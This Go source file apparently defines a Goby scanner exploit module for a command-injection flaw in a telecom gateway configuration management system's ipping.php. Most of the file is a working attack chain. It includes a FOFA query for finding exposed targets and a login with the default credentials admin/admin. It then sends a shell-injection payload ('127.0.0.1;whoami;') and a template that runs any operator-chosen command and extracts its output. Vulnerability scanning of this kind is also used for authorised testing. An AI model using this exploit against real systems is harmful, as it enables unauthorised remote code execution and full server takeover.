package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Telecom Gateway Configuration Management System ipping.php Command Execution Vulnerability",
    "Description": "<p>Telecom gateway configuration management system is an intelligent gateway management system that integrates routing, gateway configuration, user online management and other functions.</p><p>There is a command execution vulnerability in the telecom gateway configuration management system. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Telecom Gateway Configuration Management System",
    "Homepage": "http://www.hassmedia.com/",
    "DisclosureDate": "2022-11-04",
    "Author": "heiyeleng",
    "FofaQuery": "body=\"src=\\\"img/dl.gif\\\"\" && title=\"系统登录\"",
    "GobyQuery": "body=\"src=\\\"img/dl.gif\\\"\" && title=\"系统登录\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of unexpected system commands.</p><p>2. The manufacturer has not yet provided a vulnerability repair scheme. Please follow the manufacturer's homepage to update it in a timely manner: <a href=\"http://www.hassmedia.com/\">http://www.hassmedia.com/</a></p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "command",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/newlive/manager/index.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "regex",
                        "value": "Set-Cookie: PHPSESSID=(.*?); path=/",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Name",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Cookie|lastheader|regex|Set-Cookie: PHPSESSID=(.*?); path=/"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/newlive/manager/login.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "PHPSESSID={{{Cookie}}}"
                },
                "data_type": "text",
                "data": "Name=admin&Pass=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "电信网关服务器管理后台",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "index-shang.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/newlive/manager/ipping.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "PHPSESSID={{{Cookie}}}"
                },
                "data_type": "text",
                "data": "ipaddr=127.0.0.1;whoami;"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ipping.php",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "isIP(strIP)",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/newlive/manager/index.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "regex",
                        "value": "Set-Cookie: PHPSESSID=(.*?); path=/",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Name",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Cookie|lastheader|regex|Set-Cookie: PHPSESSID=(.*?); path=/"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/newlive/manager/login.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "PHPSESSID={{{Cookie}}}"
                },
                "data_type": "text",
                "data": "Name=admin&Pass=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "电信网关服务器管理后台",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "index-shang.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/newlive/manager/ipping.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "PHPSESSID={{{Cookie}}}"
                },
                "data_type": "text",
                "data": "ipaddr=127.0.0.1;{{{command}}};"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ipping.php",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "isIP(strIP)",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|0.000 ms\\n(.*)\\n</pre>"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "电信网关配置管理系统 ipping.php 命令执行漏洞",
            "Product": "电信网关配置管理系统",
            "Description": "<p>电信网关配置管理系统是一款集路由、网关配置、用户上网管理等功能于一体的智能网关管理系统。</p><p>电信网关配置管理系统存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>2、厂商尚未提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"http://www.hassmedia.com/\" target=\"_blank\">http://www.hassmedia.com/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Telecom Gateway Configuration Management System ipping.php Command Execution Vulnerability",
            "Product": "Telecom Gateway Configuration Management System",
            "Description": "<p>Telecom gateway configuration management system is an intelligent gateway management system that integrates routing, gateway configuration, user online management and other functions.<br></p><p>There is a command execution vulnerability in the telecom gateway configuration management system. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of unexpected system commands.</p><p>2. The manufacturer has not yet provided a vulnerability repair scheme. Please follow the manufacturer's homepage to update it in a timely manner: <a href=\"http://www.hassmedia.com/\" target=\"_blank\">http://www.hassmedia.com/</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}